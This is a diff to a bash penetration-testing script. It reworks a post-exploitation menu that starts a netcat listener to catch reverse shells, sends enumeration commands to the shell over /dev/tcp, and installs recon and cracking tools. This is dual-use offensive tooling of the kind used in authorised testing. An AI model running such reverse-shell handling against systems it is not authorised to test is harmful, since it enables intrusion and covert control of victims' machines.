@@ -1864,9 +1864,10 @@ post_exploitation() {
     echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
     read -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
-
-    # Run Netcat listener in the background
-    x-terminal-emulator -e "bash -c 'nc -lvnp $listen_port > /tmp/nc_output.txt & nc_pid=$!; echo $nc_pid > /tmp/nc_pid.txt'" &
+    
+    # Run Netcat listener in the background and capture the PID
+    nc -lvnp $listen_port &
+    nc_pid=$!
 
     # Wait for the reverse shell connection to be established
     sleep 3
@@ -1931,6 +1932,9 @@ post_exploitation() {
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
     done
+
+    # Kill Netcat listener after post-exploitation tasks are done
+    kill $nc_pid
 }
 
 # Function to send command to the reverse shell
@@ -1964,6 +1968,7 @@ send_command() {
         enumerate_installed_services_linux) echo "systemctl list-units --type=service" > /dev/tcp/localhost/$listen_port ;;
     esac
 }
+
 check_install_dependencies() {
     dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "wkhtmltopdf")
 
